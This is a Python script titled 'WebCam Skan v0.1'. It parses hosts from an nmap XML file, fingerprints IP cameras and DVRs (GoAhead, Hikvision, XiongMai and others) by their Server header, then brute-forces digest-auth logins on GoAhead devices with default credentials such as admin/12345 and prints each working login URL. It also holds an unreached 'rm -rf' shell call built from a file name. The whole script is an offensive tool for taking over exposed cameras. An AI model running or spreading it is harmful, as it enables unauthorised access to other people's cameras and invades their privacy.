#!/usr/bin/python3
from xml.dom import minidom
import os
import httpx


port = "81"
file = "test.xml"

lista_ip = []
srv_dnvrs = []
srv_lwip = []
srv_hikvision = []
srv_xiongmai = []
srv_goahead = []
srv_error = []
goahead_not_ok = []
goahead_ok = []

def leer_listado(file):
	file = minidom.parse(file)
	hosts = file.getElementsByTagName('address')
	for elem in hosts:
		    lista_ip.append(elem.attributes['addr'].value)
	return lista_ip
	os.system("rm -rf " + file)

def is_empty(file):
	if os.stat(file).st_size == 0:
		estado = True
	else:
		estado = False
	return estado

def server_reader(ip,port):
	try:
		host = httpx.get("http://" + ip + ":" + port)
		server = host.headers['Server']
		#print("http://" + ip + ":" + port + "/ " + server)
		if server == 'DNVRS-Webs':
			srv_dnvrs.append(ip)
		elif server == 'web':
			srv_hikvision.append(ip)
		elif server == 'uc-httpd/1.0.0':
			srv_xiongmai.append(ip)
		elif server == 'lwIP/1.4.0 (http://savannah.nongnu.org/projects/lwip)':
			srv_lwip.append(ip)
		elif server == 'GoAhead-Webs':
			srv_goahead.append(ip)
	except KeyError:
		srv_error.append(ip)
		
	except httpx.ReadTimeout:
		srv_error.append(ip)
		
	except httpx.ConnectTimeout:
		srv_error.append(ip)
		
	except httpx.RemoteProtocolError:
		srv_error.append(ip)

	except httpx.DecodingError:
		srv_error.append(ip)

		
		
def imprimir():
	print("== Results")
	print("= GoAhead-Webs: " + str(len(srv_goahead)))
	#for res in srv_goahead: 
	#	print("== http://" + res + ":" + port)
	print("= DNVRS-Webs: " + str(len(srv_dnvrs)))
	print("= Hikvision DVR: " + str(len(srv_hikvision)))
	print("= XiongMai uc-httpd: " + str(len(srv_xiongmai)))
	print("= Lightweight IP: " + str(len(srv_lwip)))
	print("= IP con Error: " + str(len(srv_error)))

def brute_pass(dir_ip,port):
	user_web = ['admin','']
	user_pass = ['admin','','12345','123456','1234567','12345678','123456789','1234567890','11111']
	try:
		for user in user_web:
			for password in user_pass:
				auth = httpx.DigestAuth(user, password)
				cam_get = httpx.get("http://" + dir_ip + ":" + port , auth=auth)
				if cam_get.status_code == 200:
					print("=* http://" + user + ":" + password + "@" + dir_ip + ":" + port + "/")
					goahead_ok.append(dir_ip)
					break

	except httpx.ConnectTimeout:
		print(dir_ip + " Error")

def main():
	print("======================")
	print("= WebCam Skan v0.1")
	print("= by rz7")
	print("======================")
	leer_listado(file)
	print("= Scanning " + str(len(lista_ip)) + " Hosts")
	print("======================")
	for ip in lista_ip:
		#print(ip)
		server_reader(ip,port)
	imprimir()
	print("======================")
	print("= GoAhead Credentials ")
	for ip in srv_goahead:
		brute_pass(ip,port)
	print("----------------------")
	print("= GoAhead Not Default Credentials ")
	goahead_not_ok = list(set(srv_goahead) - set(goahead_ok))
	for ip in goahead_not_ok:
		print("== http://" + ip + ":" + port)

main()